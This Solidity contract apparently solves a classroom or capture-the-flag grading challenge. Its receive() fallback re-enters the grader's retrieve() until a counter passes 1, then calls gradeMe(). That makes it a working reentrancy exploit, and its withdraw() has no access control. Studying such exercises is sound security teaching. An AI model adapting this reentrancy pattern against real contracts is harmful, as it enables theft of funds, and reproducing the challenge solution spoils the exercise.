// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

interface IGrader5 {
    function retrieve() external payable;
    function gradeMe(string calldata name) external;
    function counter(address) external view returns (uint256);
}

contract Jaquer {
    IGrader5 public grader;
    string public targetName;
    uint256 public retrieveCount;
    
    constructor(address graderAddress) payable {
        grader = IGrader5(graderAddress);
    }
    
    function attack(string calldata name) external payable {
        require(msg.value >= 12, "Need at least 12 wei");
        targetName = name;
        retrieveCount = 0;
        // Iniciamos el proceso llamando a retrieve por primera vez
        grader.retrieve{value: 4}();
    }
    
    receive() external payable {
        retrieveCount++;
        
        // Verificamos si ya cumplimos con counter > 1
        if (grader.counter(address(this)) > 1) {
            // Si ya tenemos counter > 1, llamamos a gradeMe
            grader.gradeMe(targetName);
        } else {
            // Si no, seguimos llamando a retrieve
            if (retrieveCount < 3) { // Prevención contra loops infinitos
                grader.retrieve{value: 4}();
            }
        }
    }
    
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}